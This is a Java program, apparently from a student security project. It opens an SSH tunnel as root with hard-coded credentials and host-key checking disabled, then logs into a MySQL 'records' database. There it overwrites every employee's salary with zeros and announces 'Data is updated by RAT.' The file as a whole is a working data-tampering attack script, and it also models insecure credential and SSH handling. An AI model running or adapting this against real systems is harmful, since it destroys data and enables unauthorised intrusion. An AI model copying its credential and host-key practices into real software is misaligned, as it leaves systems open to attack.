package cns_project_code;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.Statement;
import java.util.Properties;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
 
public class dbconnect_new
{
  private static void doSshTunnel( String strSshUser, String strSshPassword, String strSshHost, int nSshPort, String strRemoteHost, int nLocalPort, int nRemotePort ) throws JSchException
  {
    final JSch jsch = new JSch();
    Session session = jsch.getSession( strSshUser, strSshHost, 22 );
    session.setPassword( strSshPassword );
     
    final Properties config = new Properties();
    config.put( "StrictHostKeyChecking", "no" );
    session.setConfig( config );
     
    session.connect();
    session.setPortForwardingL(nLocalPort, strRemoteHost, nRemotePort);
  }
   
  public static void main(String[] args)
  {
    try
    {
      String strSshUser = "root";                  // SSH loging username
      String strSshPassword = "admin";                   // SSH login password
      String strSshHost = "192.168.0.97";          // hostname or ip or SSH server
      int nSshPort = 22;                                    // remote SSH host port number
      String strRemoteHost = "localhost";  // hostname or ip of your database server
      int nLocalPort = 3366;                                // local port number use to bind SSH tunnel
      int nRemotePort = 3306;                               // remote port number of your database 
      String strDbUser = "chaotic_rat";                    // database loging username
      String strDbPassword = "rat123";                    // database login password
       
      dbconnect_new.doSshTunnel(strSshUser, strSshPassword, strSshHost, nSshPort, strRemoteHost, nLocalPort, nRemotePort);
       
      Class.forName("com.mysql.jdbc.Driver");
      String db = "records";
      String dbUser = "root";
      String dbPasswd = "admin";
      String driver = "com.mysql.jdbc.Driver";
      String url = "jdbc:mysql://localhost:" + nLocalPort + "/";
      Connection con = DriverManager.getConnection(url+db, dbUser, dbPasswd);
      Statement st = con.createStatement();
      String sql = "UPDATE employees " +
              "SET salary = '0000000'";

      int update = st.executeUpdate(sql);
      if(update >= 1){
      System.out.println("Data is updated by RAT.");
      }
      else{
      System.out.println("Data is not updated.");
      }
      con.close();
    }
    catch( Exception e )
    {
      e.printStackTrace();
    }
    finally
    {
      System.exit(0);
    }
  }
}